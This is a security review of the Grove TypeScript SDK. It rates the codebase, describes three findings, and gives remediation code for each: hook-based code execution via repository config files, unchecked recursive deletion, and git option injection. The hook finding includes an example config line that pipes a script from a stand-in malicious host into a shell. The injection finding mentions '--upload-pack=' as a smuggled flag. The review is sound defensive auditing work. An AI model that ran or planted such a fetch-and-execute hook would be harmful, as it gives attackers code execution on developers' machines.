# Grove Security Review

This document provides a detailed security evaluation of the Grove TypeScript SDK codebase, covering potential vulnerabilities, design risks, and security hardening recommendations.

---

## 1. Security Posture Summary

- **Security Score:** 8/10
- **Risk Level:** Low (Core SDK) / Medium (Planned CLI & Monorepo Transition)
- **Key Assessment:** The core SDK is highly robust, utilizing minimal and well-vetted dependencies (`execa`, `proper-lockfile`, `zod`). It enforces strict type safety and data integrity validation at boundaries. Security mitigations against PID reuse conflicts are well-engineered. The primary design threat lies in the planned monorepo transition where CLI configuration files could execute arbitrary code via hooks.

---

## 2. Vulnerability Breakdown

### Critical Vulnerabilities
> [!NOTE]
> No critical vulnerabilities were identified in the current SDK implementation.

---

### High Priority: Local Code Execution (LCE) via Untrusted Repository Configurations
- **Location:** `docs/cli-monorepo-plan.md` (CLI configuration loading specification)
- **Impact:** High (Potential arbitrary command execution)
- **Status:** Architectural Risk / Design Phase

#### Description
The transition plan for `grove-cli` proposes auto-discovering and loading repository-level configuration files (such as `.groverc.json` or `.groverc.toml`) from the root of the target repository:
```json
// Example .groverc.json in a repository
{
  "hooks": {
    "postCreate": ["curl -s http://malicious.site/payload | sh"]
  }
}
```
Since Grove spawns a shell interpreter to run lifecycle hooks, anyone who can commit code to a repository can check in a malicious configuration. When another developer or an automated agent runs the CLI against that repository, it would trigger automatic, silent local code execution (LCE).

#### Remediation
- **Sandbox/Ignore Repo Hooks:** By default, do not load or execute hooks from repository-level config files (`.groverc.json`). Only load hooks from a trusted global config file (e.g., `~/.groverc.json`) or command-line parameters.
- **Explicit User Consent:** If repository-level hooks are supported, the CLI must prompt the user and require explicit confirmation (e.g., `Do you trust this repository configuration? [y/N]`) before executing any hook commands.

---

### Medium Priority: Directory Traversal during Worktree Destruction
- **Location:** `src/pool.ts` (inside `destroy()` and `destroyAll()`)
- **Impact:** Medium (Arbitrary directory deletion on configuration injection or database corruption)
- **Status:** Hardening Required

#### Description
During the cleanup phase of a worktree, Grove performs a recursive directory deletion on the worktree's path:
```typescript
await rm(dirname(worktreePath), { recursive: true, force: true });
```
If the internal database/state (`grove-state.json`) is maliciously edited or corrupted to point to critical directories (e.g., `/Users/username/Documents` or `/`), a call to `destroy()` or `destroyAll()` would recursively delete them without verification.

#### Remediation
Validate that any target worktree path lies strictly inside the designated pool directory (`this.poolDir`) before executing directory-level deletions:
```typescript
import { relative, isAbsolute } from "node:path";

function assertPathWithinPool(poolDir: string, targetPath: string): void {
  const rel = relative(poolDir, targetPath);
  if (rel.startsWith("..") || isAbsolute(rel)) {
    throw new Error("Security violation: target path is outside the pool boundary");
  }
}
```

---

### Low Priority: Git Argument/Option Injection Defense-in-Depth
- **Location:** `src/git/worktree.ts` (specifically `addWorktree`)
- **Impact:** Low (Potential configuration override or execution bypass)
- **Status:** Hardening Required

#### Description
Grove executes git commands via `execa` using array syntax, which prevents shell metacharacter injection:
```typescript
export async function addWorktree(repoRoot: string, path: string, branch: string): Promise<void> {
  const ref = await branchRef(repoRoot, branch);
  await runGit(repoRoot, ["worktree", "add", "--detach", path, ref]);
}
```
However, if a branch/ref input is obtained from untrusted sources (such as an external user input or an API request) and begins with a dash (e.g., `--upload-pack=...` or `-f`), Git will interpret it as an option flag rather than a positional ref argument.

#### Remediation
Inject a double dash (`--`) before positional arguments (branches/paths) to instruct Git that all subsequent arguments are positional, preventing option injection:
```typescript
export async function addWorktree(repoRoot: string, path: string, branch: string): Promise<void> {
  const ref = await branchRef(repoRoot, branch);
  await runGit(repoRoot, ["worktree", "add", "--detach", path, "--", ref]);
}
```

---

## 3. Positive Security Observations

- **Atomic State Transitions:** Grove writes state changes to a temporary file (`.tmp`) and executes `rename()` to atomically overwrite the real file. This prevents corruption during concurrent writes.
- **PID Re-use Validation:** When determining if an active slot owner is alive, the SDK queries the exact process start time (from `/proc` on Linux or `ps` on macOS). If the PID was recycled/re-assigned to a different process after a crash, the SDK detects the mismatched start time and safely releases the slot.
- **Zero-Trust Boundaries:** Zod schemas (`GroveStateSchema`, `GroveConfigSchema`) are run against configurations and state databases to guarantee type safety and structural validation.
